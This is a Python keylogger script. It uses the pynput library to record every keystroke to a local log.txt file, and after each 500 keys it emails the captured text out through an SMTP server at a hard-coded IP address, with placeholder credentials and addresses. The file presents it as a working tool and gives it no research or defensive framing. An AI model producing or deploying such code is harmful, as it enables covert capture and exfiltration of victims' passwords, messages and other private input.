import smtplib
import pynput
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

keys = [] #this list will have all the keys

### a function to add the key pressed to the list #####
def on_press(key):

    keys.append(key)
    write_file(keys)

    if  len(keys) == 500:
        send_email(keys)
        keys.clear()

#### a function to write the log in a .txt file ########
def write_file(keys):
    
    with open('log.txt', 'w') as f:
        for key in keys:
            if key == Key.space:
                f.write(" ")
            elif key == Key.backspace or key == Key.shift or key == Key.ctrl_l:
                f.write("")
            else:
                k = str(key).replace("'", "")
                f.write(k)

#### a function to send a email ###################
def send_email(keys):
    ## making the key's list a message
    textMessage = ''
    for key in keys:
        if key == Key.space:
            textMessage = textMessage + " "
        else:
            k = str(key).replace("'", "")
            textMessage = textMessage + k
            
    # create message object instance
    msg = MIMEMultipart()

    message = textMessage

    # setup the parameters of the message
    password = "your_password"
    msg['From'] = "your_email"
    msg['To'] = "your_email_again"
    msg['Subject'] = "the_subject"

    # add in the message body
    msg.attach(MIMEText(message, 'plain'))

    # create a server
    server = smtplib.SMTP('64.233.184.108', 587)
    server.starttls()

    # login the credentials
    server.login(msg['From'], password)

    # send the message via the server
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()
        
with Listener(on_press = on_press) as listener:
    listener.join()
